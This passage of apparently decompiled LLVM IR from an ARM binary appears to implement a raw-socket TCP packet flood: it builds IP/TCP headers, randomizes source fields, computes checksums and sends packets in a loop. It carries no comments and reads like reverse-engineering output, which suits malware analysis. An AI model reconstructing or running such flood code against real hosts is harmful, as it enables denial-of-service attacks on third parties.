  br i1 %v0_bdfc, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_bd98
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_be00 = load i32, i32* @r5, align 4
  %v4_be00 = add i32 %v3_be00, 6
  %v5_be00 = inttoptr i32 %v4_be00 to i16*
  store i16 64, i16* %v5_be00, align 2
  %v0_be08.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t17 = trunc i32 %v0_be08.pre to i8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_bd98, %bb
  %v0_be08.off0 = phi i8 [ %extract.t, %dec_label_pc_bd98 ], [ %extract.t17, %bb ]
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_be08 = load i32, i32* @r5, align 4
  %v3_be08 = add i32 %v2_be08, 8
  %v4_be08 = inttoptr i32 %v3_be08 to i8*
  store i8 %v0_be08.off0, i8* %v4_be08, align 1
  %v0_be0c = load i32, i32* %r3.global-to-local, align 4
  %v1_be0c = trunc i32 %v0_be0c to i8
  %v2_be0c = load i32, i32* @r5, align 4
  %v3_be0c = add i32 %v2_be0c, 9
  %v4_be0c = inttoptr i32 %v3_be0c to i8*
  store i8 %v1_be0c, i8* %v4_be0c, align 1
  store i32 %v6_bc64, i32* %ip.global-to-local, align 4
  %v1_be14 = load i32, i32* @r5, align 4
  %v2_be14 = add i32 %v1_be14, 12
  %v3_be14 = inttoptr i32 %v2_be14 to i32*
  store i32 %v6_bc64, i32* %v3_be14, align 4
  %v0_be18 = load i32, i32* %r1.global-to-local, align 4
  %v1_be18 = add i32 %v0_be18, 16
  %v2_be18 = inttoptr i32 %v1_be18 to i32*
  %v3_be18 = load i32, i32* %v2_be18, align 4
  store i32 %v3_be18, i32* %r3.global-to-local, align 4
  %v0_be1c = load i32, i32* @sb, align 4
  %v1_be1c = trunc i32 %v0_be1c to i16
  %v2_be1c = load i32, i32* @r5, align 4
  %v3_be1c = add i32 %v2_be1c, 2
  %v4_be1c = inttoptr i32 %v3_be1c to i16*
  store i16 %v1_be1c, i16* %v4_be1c, align 2
  %v0_be20 = load i32, i32* @fp, align 4
  %v1_be20 = trunc i32 %v0_be20 to i16
  %v2_be20 = load i32, i32* @r5, align 4
  %v3_be20 = add i32 %v2_be20, 4
  %v4_be20 = inttoptr i32 %v3_be20 to i16*
  store i16 %v1_be20, i16* %v4_be20, align 2
  %v0_be24 = load i32, i32* %r3.global-to-local, align 4
  %v1_be24 = load i32, i32* @r5, align 4
  %v2_be24 = add i32 %v1_be24, 16
  %v3_be24 = inttoptr i32 %v2_be24 to i32*
  store i32 %v0_be24, i32* %v3_be24, align 4
  %v0_be28 = load i32, i32* @r6, align 4
  %v1_be28 = trunc i32 %v0_be28 to i16
  %v2_be28 = load i32, i32* @r5, align 4
  %v3_be28 = add i32 %v2_be28, 20
  %v4_be28 = inttoptr i32 %v3_be28 to i16*
  store i16 %v1_be28, i16* %v4_be28, align 2
  %v0_be2c = load i32, i32* @r5, align 4
  %v1_be2c = add i32 %v0_be2c, 20
  store i32 %v1_be2c, i32* @r4, align 4
  %v1_be30 = add i32 %v0_be2c, 32
  %v2_be30 = inttoptr i32 %v1_be30 to i8*
  %v3_be30 = load i8, i8* %v2_be30, align 1
  %v4_be30 = zext i8 %v3_be30 to i32
  store i32 %v4_be30, i32* %r3.global-to-local, align 4
  %v1_be34 = add i32 %v0_be2c, 33
  %v2_be34 = inttoptr i32 %v1_be34 to i8*
  %v3_be34 = load i8, i8* %v2_be34, align 1
  %v4_be34 = zext i8 %v3_be34 to i32
  store i32 %v1_bd3c, i32* %r0.global-to-local, align 4
  %tmp76 = urem i8 %v3_be30, 16
  %v1_be3c = zext i8 %tmp76 to i32
  %v1_be40 = or i32 %v1_be3c, 80
  store i32 %v1_be40, i32* %r3.global-to-local, align 4
  %v1_be44 = and i32 %v4_be34, 223
  store i32 %v1_be44, i32* %r2.global-to-local, align 4
  %v1_be48 = trunc i32 %v1_be40 to i8
  store i8 %v1_be48, i8* %v2_be30, align 1
  %v0_be4c = load i32, i32* %r2.global-to-local, align 4
  %v1_be4c = load i32, i32* %r0.global-to-local, align 4
  %v4_be4c = mul i32 %v1_be4c, 32
  %v5_be4c = or i32 %v4_be4c, %v0_be4c
  store i32 %v5_be4c, i32* %r2.global-to-local, align 4
  store i32 %v5_bd44, i32* %r1.global-to-local, align 4
  %v1_be54 = trunc i32 %v5_be4c to i8
  %v2_be54 = load i32, i32* @r4, align 4
  %v3_be54 = add i32 %v2_be54, 13
  %v4_be54 = inttoptr i32 %v3_be54 to i8*
  store i8 %v1_be54, i8* %v4_be54, align 1
  %v0_be58 = load i32, i32* @r4, align 4
  %v1_be58 = add i32 %v0_be58, 13
  %v2_be58 = inttoptr i32 %v1_be58 to i8*
  %v3_be58 = load i8, i8* %v2_be58, align 1
  %v4_be58 = zext i8 %v3_be58 to i32
  store i32 %v1_bd40, i32* %r2.global-to-local, align 4
  %v1_be60 = and i32 %v4_be58, 239
  %v5_be64 = or i32 %v1_be60, %v4_be64
  store i32 %v5_be64, i32* %r3.global-to-local, align 4
  %v0_be68 = load i32, i32* %r1.global-to-local, align 4
  %v2_be68 = add i32 %v0_be58, 4
  %v3_be68 = inttoptr i32 %v2_be68 to i32*
  store i32 %v0_be68, i32* %v3_be68, align 4
  %v0_be6c = load i32, i32* @sl, align 4
  %v1_be6c = trunc i32 %v0_be6c to i16
  %v2_be6c = load i32, i32* @r4, align 4
  %v3_be6c = add i32 %v2_be6c, 2
  %v4_be6c = inttoptr i32 %v3_be6c to i16*
  store i16 %v1_be6c, i16* %v4_be6c, align 2
  %v0_be70 = load i32, i32* %r3.global-to-local, align 4
  %v1_be70 = trunc i32 %v0_be70 to i8
  %v2_be70 = load i32, i32* @r4, align 4
  %v3_be70 = add i32 %v2_be70, 13
  %v4_be70 = inttoptr i32 %v3_be70 to i8*
  store i8 %v1_be70, i8* %v4_be70, align 1
  %v0_be74 = load i32, i32* @r4, align 4
  %v1_be74 = add i32 %v0_be74, 13
  %v2_be74 = inttoptr i32 %v1_be74 to i8*
  %v3_be74 = load i8, i8* %v2_be74, align 1
  %v4_be74 = zext i8 %v3_be74 to i32
  store i32 %v1_bd68, i32* %r3.global-to-local, align 4
  %v1_be7c = and i32 %v4_be74, 247
  %v5_be80 = or i32 %v1_be7c, %v4_be80
  store i32 %v5_be80, i32* %r2.global-to-local, align 4
  %v1_be84 = trunc i32 %v5_be80 to i8
  store i8 %v1_be84, i8* %v2_be74, align 1
  %v0_be88 = load i32, i32* @r4, align 4
  %v1_be88 = add i32 %v0_be88, 13
  %v2_be88 = inttoptr i32 %v1_be88 to i8*
  %v3_be88 = load i8, i8* %v2_be88, align 1
  %v4_be88 = zext i8 %v3_be88 to i32
  store i32 %v1_bd6c, i32* %ip.global-to-local, align 4
  %v1_be90 = and i32 %v4_be88, 251
  %v5_be94 = or i32 %v1_be90, %v4_be94
  store i32 %v5_be94, i32* %r3.global-to-local, align 4
  %v1_be98 = trunc i32 %v5_be94 to i8
  store i8 %v1_be98, i8* %v2_be88, align 1
  %v0_be9c = load i32, i32* @r4, align 4
  %v1_be9c = add i32 %v0_be9c, 13
  %v2_be9c = inttoptr i32 %v1_be9c to i8*
  %v3_be9c = load i8, i8* %v2_be9c, align 1
  %v4_be9c = zext i8 %v3_be9c to i32
  store i32 %v1_bd70, i32* %r0.global-to-local, align 4
  %v1_bea4 = and i32 %v4_be9c, 253
  %v4_bea8 = or i32 %v1_bea4, %v3_bea8
  store i32 %v4_bea8, i32* %r2.global-to-local, align 4
  %v1_beac = trunc i32 %v4_bea8 to i8
  store i8 %v1_beac, i8* %v2_be9c, align 1
  %v0_beb0 = load i32, i32* @r4, align 4
  %v1_beb0 = add i32 %v0_beb0, 13
  %v2_beb0 = inttoptr i32 %v1_beb0 to i8*
  %v3_beb0 = load i8, i8* %v2_beb0, align 1
  %v4_beb0 = zext i8 %v3_beb0 to i32
  store i32 %v1_bd74, i32* %r1.global-to-local, align 4
  %v1_beb8 = and i32 %v4_beb0, 254
  %v2_bebc = or i32 %v1_beb8, %v1_bd74
  store i32 %v2_bebc, i32* %r3.global-to-local, align 4
  %v1_bec0 = trunc i32 %v2_bebc to i8
  store i8 %v1_bec0, i8* %v2_beb0, align 1
  %v0_bec4 = call i32 @function_e7dc()
  %v1_bec4 = trunc i32 %v0_bec4 to i16
  store i32 %v0_bec4, i32* %r0.global-to-local, align 4
  store i32 %v1_bd78, i32* %r2.global-to-local, align 4
  store i1 %v2_becc, i1* %cpsr_z.global-to-local, align 1
  %v3_bed8.pre = load i32, i32* @r4, align 4
  br i1 %v2_becc, label %.thread4, label %bb68

bb68:                                             ; preds = %.thread
  %v2_bed0 = add i32 %v3_bed8.pre, 13
  %v3_bed0 = inttoptr i32 %v2_bed0 to i8*
  %v4_bed0 = load i8, i8* %v3_bed0, align 1
  %v5_bed0 = zext i8 %v4_bed0 to i32
  %v2_bed4 = or i32 %v5_bed0, 8
  store i32 %v2_bed4, i32* @r3, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread, %bb68
  %v4_bed8 = add i32 %v3_bed8.pre, 14
  %v5_bed8 = inttoptr i32 %v4_bed8 to i16*
  store i16 %v1_bec4, i16* %v5_bed8, align 2
  store i32 %v6_bc28, i32* %r1.global-to-local, align 4
  %v0_bee0 = load i32, i32* @r5, align 4
  %v1_bee0 = add i32 %v0_bee0, 40
  store i32 %v1_bee0, i32* %r0.global-to-local, align 4
  br i1 %v2_becc, label %bb70, label %bb69

bb69:                                             ; preds = %.thread4
  %v1_bee4 = load i32, i32* @r3, align 4
  %v2_bee4 = trunc i32 %v1_bee4 to i8
  %v3_bee4 = load i32, i32* @r4, align 4
  %v4_bee4 = add i32 %v3_bee4, 13
  %v5_bee4 = inttoptr i32 %v4_bee4 to i8*
  store i8 %v2_bee4, i8* %v5_bee4, align 1
  br label %bb70

bb70:                                             ; preds = %.thread4, %bb69
  %v2_bee8 = inttoptr i32 %v1_bee0 to i16*
  %v3_bee8 = call i32 @function_e9dc(i16* %v2_bee8, i32 %v6_bc28)
  store i32 %v3_bee8, i32* %r0.global-to-local, align 4
  %v3_beec = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_beec, i32* %r3.global-to-local, align 4
  %v1_bef0 = add i32 %v3_beec, 1
  store i32 %v1_bef0, i32* @r4, align 4
  %v1_bef4 = load i32, i32* @r7, align 4
  %v9_bef4 = icmp eq i32 %v1_bef0, %v1_bef4
  store i1 %v9_bef4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bef0, i32* %stack_var_-44, align 4
  %v5_befc = icmp slt i32 %v1_bef0, %v1_bef4
  br i1 %v5_befc, label %dec_label_pc_bd98, label %dec_label_pc_bf00

dec_label_pc_bf00:                                ; preds = %bb70
  store i32 %v6_bc28, i32* %r3.global-to-local, align 4
  %v1_bf04 = add i32 %v6_bc28, 20
  store i32 %v1_bf04, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_bf0c

dec_label_pc_bf0c:                                ; preds = %dec_label_pc_c150, %dec_label_pc_bf00
  %v0_bf248 = phi i32 [ %v1_bef4, %dec_label_pc_bf00 ], [ 0, %dec_label_pc_c150 ]
  %stack_var_-140.0 = phi i32 [ %v3_bce8, %dec_label_pc_bf00 ], [ %v3_c15c, %dec_label_pc_c150 ]
  %storemerge = add i32 %v6_bc28, 40
  store i32 %storemerge, i32* %fp.global-to-local, align 4
  store i32 %stack_var_-140.0, i32* %r1.global-to-local, align 4
  %v1_bf10 = add i32 %stack_var_-140.0, 1310720
  store i32 %v1_bf10, i32* %r2.global-to-local, align 4
  %tmp71 = udiv i32 %v1_bf10, 256
  %v3_bf18 = and i32 %tmp71, 65280
  store i32 %v3_bf18, i32* %r3.global-to-local, align 4
  %v4_bf1c = udiv i32 %v1_bf10, 16777216
  %v5_bf1c = or i32 %v3_bf18, %v4_bf1c
  store i32 %v5_bf1c, i32* @sl, align 4
  %v3_c0bc = icmp eq i32 %v3_bcc0, 65535
  %v2_c120 = icmp eq i32 %v1_bc50, 0
  %v2_bf5c = icmp eq i32 %v6_bc64, -1
  %v7_bf5c = icmp eq i32 %v6_bc64, -1
  br label %dec_label_pc_bf20

dec_label_pc_bf20:                                ; preds = %dec_label_pc_bf20, %dec_label_pc_c038, %dec_label_pc_bf0c
  %v0_bf24 = phi i32 [ %v0_bf248, %dec_label_pc_bf0c ], [ 0, %dec_label_pc_c038 ], [ 0, %dec_label_pc_bf20 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_bf24 = icmp eq i32 %v0_bf24, 0
  store i1 %v2_bf24, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_bf24, label %dec_label_pc_bf20, label %dec_label_pc_bf30

dec_label_pc_bf30:                                ; preds = %dec_label_pc_bf20, %dec_label_pc_c038
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bf34

dec_label_pc_bf34:                                ; preds = %dec_label_pc_bfb4, %dec_label_pc_bf30
  %v1_bf48 = phi i32 [ %v1_c028, %dec_label_pc_bfb4 ], [ 0, %dec_label_pc_bf30 ]
  %v5_bf38 = mul i32 %v1_bf48, 24
  %v1_bf3c = load i32, i32* @r8, align 4
  %v2_bf3c = add i32 %v1_bf3c, %v5_bf38
  store i32 %v2_bf3c, i32* %r3.global-to-local, align 4
  store i32 %v2_ba94, i32* %ip.global-to-local, align 4
  %v1_bf44 = add i32 %v2_bf3c, 20
  %v2_bf44 = inttoptr i32 %v1_bf44 to i8*
  %v3_bf44 = load i8, i8* %v2_bf44, align 1
  %v4_bf44 = zext i8 %v3_bf44 to i32
  store i32 %v4_bf44, i32* %r2.global-to-local, align 4
  %v4_bf48 = mul i32 %v1_bf48, 4
  %v5_bf48 = add i32 %v4_bf48, %v2_ba94
  %v6_bf48 = inttoptr i32 %v5_bf48 to i32*
  %v7_bf48 = load i32, i32* %v6_bf48, align 4
  store i32 %v7_bf48, i32* @r5, align 4
  %v7_bf4c = icmp eq i8 %v3_bf44, 31
  store i1 %v7_bf4c, i1* %cpsr_z.global-to-local, align 1
  %v1_bf50 = add i32 %v7_bf48, 20
  store i32 %v1_bf50, i32* @r6, align 4
  %tmp77 = icmp ult i8 %v3_bf44, 32
  br i1 %tmp77, label %dec_label_pc_c04c, label %dec_label_pc_bf58

dec_label_pc_bf58:                                ; preds = %dec_label_pc_bf34
  store i32 %v6_bc64, i32* %r0.global-to-local, align 4
  store i1 %v7_bf5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_bf5c, label %dec_label_pc_c0ac, label %dec_label_pc_bf64

dec_label_pc_bf64:                                ; preds = %dec_label_pc_c04c, %dec_label_pc_bf58
  store i32 %v3_bcc0, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c0bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c0bc, label %dec_label_pc_c0c8, label %dec_label_pc_bf78

dec_label_pc_bf78:                                ; preds = %dec_label_pc_c0ac.dec_label_pc_bf78_crit_edge, %dec_label_pc_bf64
  %v1_bf7c = phi i32 [ %v1_bf7c.pre, %dec_label_pc_c0ac.dec_label_pc_bf78_crit_edge ], [ 65535, %dec_label_pc_bf64 ]
  store i32 %v3_bcc4, i32* %r2.global-to-local, align 4
  %v9_bf7c = icmp eq i32 %v3_bcc4, %v1_bf7c
  store i1 %v9_bf7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bf7c, label %dec_label_pc_c0dc, label %dec_label_pc_bf84

dec_label_pc_bf84:                                ; preds = %dec_label_pc_c0c8.dec_label_pc_bf84_crit_edge, %dec_label_pc_bf78
  %v1_bf88 = phi i32 [ %v1_bf88.pre, %dec_label_pc_c0c8.dec_label_pc_bf84_crit_edge ], [ %v1_bf7c, %dec_label_pc_bf78 ]
  store i32 %v3_bcc8, i32* %r3.global-to-local, align 4
  %v9_bf88 = icmp eq i32 %v3_bcc8, %v1_bf88
  store i1 %v9_bf88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bf88, label %dec_label_pc_c0f0, label %dec_label_pc_bf90

dec_label_pc_bf90:                                ; preds = %dec_label_pc_c0dc.dec_label_pc_bf90_crit_edge, %dec_label_pc_bf84
  %v1_bf94 = phi i32 [ %v1_bf94.pre, %dec_label_pc_c0dc.dec_label_pc_bf90_crit_edge ], [ %v1_bf88, %dec_label_pc_bf84 ]
  store i32 %v5_bb64, i32* %ip.global-to-local, align 4
  %v9_bf94 = icmp eq i32 %v5_bb64, %v1_bf94
  store i1 %v9_bf94, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bf94, label %dec_label_pc_c104, label %dec_label_pc_bf9c

dec_label_pc_bf9c:                                ; preds = %dec_label_pc_c0f0.dec_label_pc_bf9c_crit_edge, %dec_label_pc_bf90
  %v1_bfa0 = phi i32 [ %v1_bfa0.pre, %dec_label_pc_c0f0.dec_label_pc_bf9c_crit_edge ], [ %v1_bf94, %dec_label_pc_bf90 ]
  store i32 %v6_bb80, i32* %r0.global-to-local, align 4
  %v9_bfa0 = icmp eq i32 %v6_bb80, %v1_bfa0
  store i1 %v9_bfa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_bfa0, label %dec_label_pc_c118, label %dec_label_pc_bfa8

dec_label_pc_bfa8:                                ; preds = %dec_label_pc_c104, %dec_label_pc_bf9c
  store i32 %v1_bc50, i32* %r1.global-to-local, align 4
  store i1 %v2_c120, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c120, label %dec_label_pc_bfb4, label %dec_label_pc_c12c

dec_label_pc_bfb4:                                ; preds = %dec_label_pc_bfa8, %dec_label_pc_c118, %dec_label_pc_c12c
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_bfb8 = load i32, i32* @r5, align 4
  %v3_bfb8 = add i32 %v2_bfb8, 10
  %v4_bfb8 = inttoptr i32 %v3_bfb8 to i16*
  store i16 0, i16* %v4_bfb8, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_bfc0 = load i32, i32* @r5, align 4
  store i32 %v0_bfc0, i32* @r0, align 4
  %v2_bfc4 = call i32 @function_cef4(i32 %v0_bfc0, i32 20)
  %v3_bfc4 = trunc i32 %v2_bfc4 to i16
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_bfcc = load i32, i32* @r5, align 4
  %v4_bfcc = add i32 %v3_bfcc, 10
  %v5_bfcc = inttoptr i32 %v4_bfcc to i16*
  store i16 %v3_bfc4, i16* %v5_bfcc, align 2
  %v0_bfd0 = load i32, i32* @r6, align 4
  store i32 %v0_bfd0, i32* @r1, align 4
  %v0_bfd4 = load i32, i32* %r3.global-to-local, align 4
  %v1_bfd4 = trunc i32 %v0_bfd4 to i16
  %v3_bfd4 = add i32 %v0_bfd0, 16
  %v4_bfd4 = inttoptr i32 %v3_bfd4 to i16*
  store i16 %v1_bfd4, i16* %v4_bfd4, align 2
  %v0_bfd8 = load i32, i32* @sl, align 4
  store i32 %v0_bfd8, i32* %r2.global-to-local, align 4
  %v0_bfdc = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_bfdc, i32* %r3.global-to-local, align 4
  %v0_bfe0 = load i32, i32* @r5, align 4
  store i32 %v0_bfe0, i32* %r0.global-to-local, align 4
  %v4_bfe4 = call i32 @function_cf44(i32 %v0_bfe0, i32 %v0_bfd0, i32 %v0_bfd8, i32 %v0_bfdc)
  %v5_bfe4 = trunc i32 %v4_bfe4 to i16
  store i32 %v4_bfe4, i32* %r0.global-to-local, align 4
  %v3_bfe8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_bfe8, i32* %r3.global-to-local, align 4
  %v3_bfec = mul i32 %v3_bfe8, 32
  store i32 %v3_bfec, i32* %lr.global-to-local, align 4
  %v3_bff0 = load i32, i32* @r6, align 4
  %v4_bff0 = add i32 %v3_bff0, 16
  %v5_bff0 = inttoptr i32 %v4_bff0 to i16*
  store i16 %v5_bfe4, i16* %v5_bff0, align 2
  %v0_bff4 = load i32, i32* %lr.global-to-local, align 4
  %v1_bff4 = load i32, i32* %r3.global-to-local, align 4
  %tmp78 = mul i32 %v1_bff4, -8
  %v5_bff4 = add i32 %v0_bff4, %tmp78
  store i32 %v5_bff4, i32* %lr.global-to-local, align 4
  %v0_bff8 = load i32, i32* @r6, align 4
  %v1_bff8 = add i32 %v0_bff8, 2
  %v2_bff8 = inttoptr i32 %v1_bff8 to i16*
  %v3_bff8 = load i16, i16* %v2_bff8, align 2
  %v1_bffc = load i32, i32* @r8, align 4
  %v2_bffc = add i32 %v1_bffc, %v5_bff4
  store i32 %v2_bffc, i32* @lr, align 4
  %v3_c000 = add i32 %v2_bffc, 2
  %v4_c000 = inttoptr i32 %v3_c000 to i16*
  store i16 %v3_bff8, i16* %v4_c000, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c00c = load i32, i32* @r5, align 4
  store i32 %v0_c00c, i32* %r1.global-to-local, align 4
  store i32 %v3_bc78, i32* %r0.global-to-local, align 4
  %v0_c014 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_c014, i32* %r2.global-to-local, align 4
  %v0_c018 = load i32, i32* @lr, align 4
  %v6_c020 = call i32 @function_10d6c(i32 %v3_bc78, i32 %v0_c00c, i32 %v0_c014, i32 16384, i32 %v0_c018, i32 16)
  %v3_c024 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c024, i32* %r3.global-to-local, align 4
  %v1_c028 = add i32 %v3_c024, 1
  store i32 %v1_c028, i32* %r0.global-to-local, align 4
  %v1_c02c = load i32, i32* @r7, align 4
  %v9_c02c = icmp eq i32 %v1_c028, %v1_c02c
  store i1 %v9_c02c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_c028, i32* %stack_var_-44, align 4
  %v5_c034 = icmp slt i32 %v1_c028, %v1_c02c
  br i1 %v5_c034, label %dec_label_pc_bf34, label %dec_label_pc_c038

dec_label_pc_c038:                                ; preds = %dec_label_pc_bfb4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c03c = icmp eq i32 %v1_c02c, 0
  store i1 %v2_c03c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c03c, label %dec_label_pc_bf20, label %dec_label_pc_bf30

dec_label_pc_c04c:                                ; preds = %dec_label_pc_bf34
  %v1_c04c = add i32 %v2_bf3c, 16
  %v2_c04c = inttoptr i32 %v1_c04c to i32*
  %v3_c04c = load i32, i32* %v2_c04c, align 4
  %v0_c050 = call i32 @function_e7dc()
  store i32 %v0_c050, i32* %r0.global-to-local, align 4
  %v3_c054 = load i32, i32* %stack_var_-44, align 4
  %v5_c05c = mul i32 %v3_c054, 24
  %v1_c060 = and i32 %v3_c04c, 16711680
  store i32 %v1_c060, i32* %ip.global-to-local, align 4
  %v3_c064 = udiv i32 %v3_c04c, 16777216
  %v4_c068 = udiv i32 %v1_c060, 256
  %v5_c068 = or i32 %v4_c068, %v3_c064
  store i32 %v5_c068, i32* %r2.global-to-local, align 4
  %v1_c06c = load i32, i32* @r8, align 4
  %v2_c06c = add i32 %v1_c06c, %v5_c05c
  store i32 %v2_c06c, i32* %r1.global-to-local, align 4
  %v1_c070 = and i32 %v3_c04c, 65280
  store i32 %v1_c070, i32* %r3.global-to-local, align 4
  %v1_c074 = add i32 %v2_c06c, 20
  %v2_c074 = inttoptr i32 %v1_c074 to i8*
  %v3_c074 = load i8, i8* %v2_c074, align 1
  %v4_c074 = zext i8 %v3_c074 to i32
  store i32 %v4_c074, i32* %ip.global-to-local, align 4
  %v5_c07c = call i32 @llvm.bswap.i32(i32 %v3_c04c)
  %v7_c080 = lshr i32 %v0_c050, %v4_c074
  %v8_c080 = add i32 %v7_c080, %v5_c07c
  store i32 %v8_c080, i32* %r2.global-to-local, align 4
  %v1_c090 = and i32 %v8_c080, 65280
  store i32 %v1_c090, i32* %r1.global-to-local, align 4
  store i32 %v6_bc64, i32* %r0.global-to-local, align 4
  %v5_c09c = call i32 @llvm.bswap.i32(i32 %v8_c080)
  store i32 %v5_c09c, i32* %r3.global-to-local, align 4
  store i1 %v7_bf5c, i1* %cpsr_z.global-to-local, align 1
  %v1_c0a4 = load i32, i32* @r5, align 4
  %v2_c0a4 = add i32 %v1_c0a4, 16
  %v3_c0a4 = inttoptr i32 %v2_c0a4 to i32*
  store i32 %v5_c09c, i32* %v3_c0a4, align 4
  br i1 %v2_bf5c, label %dec_label_pc_c0ac, label %dec_label_pc_bf64

dec_label_pc_c0ac:                                ; preds = %dec_label_pc_c04c, %dec_label_pc_bf58
  %v0_c0ac = call i32 @function_e7dc()
  store i32 %v0_c0ac, i32* %r0.global-to-local, align 4
  store i32 %v3_bcc0, i32* %r1.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c0bc, i1* %cpsr_z.global-to-local, align 1
  %v1_c0c0 = load i32, i32* @r5, align 4
  %v2_c0c0 = add i32 %v1_c0c0, 12
  %v3_c0c0 = inttoptr i32 %v2_c0c0 to i32*
  store i32 %v0_c0ac, i32* %v3_c0c0, align 4
  br i1 %v3_c0bc, label %dec_label_pc_c0c8, label %dec_label_pc_c0ac.dec_label_pc_bf78_crit_edge

dec_label_pc_c0ac.dec_label_pc_bf78_crit_edge:    ; preds = %dec_label_pc_c0ac
  %v1_bf7c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bf78

dec_label_pc_c0c8:                                ; preds = %dec_label_pc_c0ac, %dec_label_pc_bf64
  %v0_c0c8 = call i32 @function_e7dc()
  %v1_c0c8 = trunc i32 %v0_c0c8 to i16
  store i32 %v0_c0c8, i32* %r0.global-to-local, align 4
  store i32 %v3_bcc4, i32* %r2.global-to-local, align 4
  %v1_c0d0 = load i32, i32* @r4, align 4
  %v9_c0d0 = icmp eq i32 %v3_bcc4, %v1_c0d0
  store i1 %v9_c0d0, i1* %cpsr_z.global-to-local, align 1
  %v3_c0d4 = load i32, i32* @r5, align 4
  %v4_c0d4 = add i32 %v3_c0d4, 4
  %v5_c0d4 = inttoptr i32 %v4_c0d4 to i16*
  store i16 %v1_c0c8, i16* %v5_c0d4, align 2
  br i1 %v9_c0d0, label %dec_label_pc_c0dc, label %dec_label_pc_c0c8.dec_label_pc_bf84_crit_edge

dec_label_pc_c0c8.dec_label_pc_bf84_crit_edge:    ; preds = %dec_label_pc_c0c8
  %v1_bf88.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bf84

dec_label_pc_c0dc:                                ; preds = %dec_label_pc_c0c8, %dec_label_pc_bf78
  %v0_c0dc = call i32 @function_e7dc()
  %v1_c0dc = trunc i32 %v0_c0dc to i16
  store i32 %v0_c0dc, i32* %r0.global-to-local, align 4
  store i32 %v3_bcc8, i32* %r3.global-to-local, align 4
  %v1_c0e4 = load i32, i32* @r4, align 4
  %v9_c0e4 = icmp eq i32 %v3_bcc8, %v1_c0e4
  store i1 %v9_c0e4, i1* %cpsr_z.global-to-local, align 1
  %v3_c0e8 = load i32, i32* @r5, align 4
  %v4_c0e8 = add i32 %v3_c0e8, 20
  %v5_c0e8 = inttoptr i32 %v4_c0e8 to i16*
  store i16 %v1_c0dc, i16* %v5_c0e8, align 2
  br i1 %v9_c0e4, label %dec_label_pc_c0f0, label %dec_label_pc_c0dc.dec_label_pc_bf90_crit_edge

dec_label_pc_c0dc.dec_label_pc_bf90_crit_edge:    ; preds = %dec_label_pc_c0dc
  %v1_bf94.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bf90

dec_label_pc_c0f0:                                ; preds = %dec_label_pc_c0dc, %dec_label_pc_bf84
  %v0_c0f0 = call i32 @function_e7dc()
  %v1_c0f0 = trunc i32 %v0_c0f0 to i16
  store i32 %v0_c0f0, i32* %r0.global-to-local, align 4
  store i32 %v5_bb64, i32* %ip.global-to-local, align 4
  %v1_c0f8 = load i32, i32* @r4, align 4
  %v9_c0f8 = icmp eq i32 %v5_bb64, %v1_c0f8
  store i1 %v9_c0f8, i1* %cpsr_z.global-to-local, align 1
  %v3_c0fc = load i32, i32* @r6, align 4
  %v4_c0fc = add i32 %v3_c0fc, 2
  %v5_c0fc = inttoptr i32 %v4_c0fc to i16*
  store i16 %v1_c0f0, i16* %v5_c0fc, align 2
  br i1 %v9_c0f8, label %dec_label_pc_c104, label %dec_label_pc_c0f0.dec_label_pc_bf9c_crit_edge

dec_label_pc_c0f0.dec_label_pc_bf9c_crit_edge:    ; preds = %dec_label_pc_c0f0
  %v1_bfa0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bf9c

dec_label_pc_c104:                                ; preds = %dec_label_pc_c0f0, %dec_label_pc_bf90
  %v0_c104 = call i32 @function_e7dc()
  %v1_c108 = load i32, i32* @r6, align 4
  %v2_c108 = add i32 %v1_c108, 4
  %v3_c108 = inttoptr i32 %v2_c108 to i32*
  store i32 %v0_c104, i32* %v3_c108, align 4
  store i32 %v6_bb80, i32* %r0.global-to-local, align 4
  %v1_c110 = load i32, i32* @r4, align 4
  %v9_c110 = icmp eq i32 %v6_bb80, %v1_c110
  store i1 %v9_c110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c110, label %dec_label_pc_c118, label %dec_label_pc_bfa8

dec_label_pc_c118:                                ; preds = %dec_label_pc_c104, %dec_label_pc_bf9c
  %v0_c118 = call i32 @function_e7dc()
  store i32 %v0_c118, i32* %r0.global-to-local, align 4
  store i32 %v1_bc50, i32* %r1.global-to-local, align 4
  store i1 %v2_c120, i1* %cpsr_z.global-to-local, align 1
  %v1_c124 = load i32, i32* @r6, align 4
  %v2_c124 = add i32 %v1_c124, 8
  %v3_c124 = inttoptr i32 %v2_c124 to i32*
